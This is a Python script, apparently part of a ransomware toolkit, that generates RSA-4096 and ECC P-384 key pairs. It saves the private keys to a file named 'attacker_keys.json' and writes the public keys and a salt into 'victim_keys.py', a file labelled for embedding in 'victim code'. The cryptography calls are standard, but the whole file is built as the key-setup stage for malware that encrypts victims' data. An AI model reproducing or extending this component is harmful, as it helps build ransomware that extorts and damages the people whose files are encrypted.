#!/usr/bin/env python3
"""
MODERN KEY GENERATOR - FIXED SYNCHRONIZED VERSION
"""
import os
import sys
import json
import base64
import time
import secrets
import hashlib
from cryptography.hazmat.primitives.asymmetric import rsa, ec
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend

class ModernKeyGenerator:
    def __init__(self):
        self.keys = {}
    
    def generate_rsa_4096(self):
        """Generate RSA-4096 key pair"""
        print("[+] Generating RSA-4096 key pair...")
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=4096,
            backend=default_backend()
        )
        
        public_key = private_key.public_key()
        
        private_pem = private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        )
        
        public_pem = public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
        
        private_b64 = base64.b64encode(private_pem).decode('ascii')
        public_b64 = base64.b64encode(public_pem).decode('ascii')
        
        self.keys['rsa_private'] = private_b64
        self.keys['rsa_public'] = public_b64
        
        return private_key, public_key
    
    def generate_ecc_key(self):
        """Generate ECC P-384 key pair"""
        print("[+] Generating ECC P-384 key pair...")
        private_key = ec.generate_private_key(
            ec.SECP384R1(),
            backend=default_backend()
        )
        
        public_key = private_key.public_key()
        
        private_pem = private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        )
        
        public_pem = public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
        
        private_b64 = base64.b64encode(private_pem).decode('ascii')
        public_b64 = base64.b64encode(public_pem).decode('ascii')
        
        self.keys['ecc_private'] = private_b64
        self.keys['ecc_public'] = public_b64
        
        return private_key, public_key
    
    def create_key_package(self):
        """Create complete key package"""
        print("[+] Creating key package...")
        
        self.generate_rsa_4096()
        self.generate_ecc_key()
        
        self.keys['salt'] = base64.b64encode(secrets.token_bytes(32)).decode('ascii')
        
        unique_id = hashlib.sha256(f"{time.time()}{secrets.token_bytes(32)}".encode()).hexdigest()[:16]
        self.keys['id'] = unique_id
        
        with open('attacker_keys.json', 'w') as f:
            json.dump({
                'rsa_private': self.keys['rsa_private'],
                'ecc_private': self.keys['ecc_private'],
                'salt': self.keys['salt'],
                'id': self.keys['id']
            }, f, indent=2)
        
        with open('victim_keys.py', 'w') as f:
            f.write('#!/usr/bin/env python3\n')
            f.write('"""\nMODERN PUBLIC KEYS - EMBED IN VICTIM CODE\n"""\n\n')
            f.write('PUBLIC_KEYS = {\n')
            f.write(f'    "rsa_public": """{self.keys["rsa_public"]}""",\n')
            f.write(f'    "ecc_public": """{self.keys["ecc_public"]}""",\n')
            f.write(f'    "id": "{self.keys["id"]}"\n')
            f.write('}\n\n')
            f.write(f'SALT = """{self.keys["salt"]}"""\n')
        
        print(f"\n[+] KEY GENERATION COMPLETE!")
        print(f"[+] Unique ID: {unique_id}")
        return self.keys

def main():
    print("\n" + "=" * 60)
    print("MODERN KEY GENERATOR - FIXED VERSION")
    print("=" * 60)
    
    try:
        generator = ModernKeyGenerator()
        generator.create_key_package()
        print("\n[+] Files created: attacker_keys.json, victim_keys.py")
    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()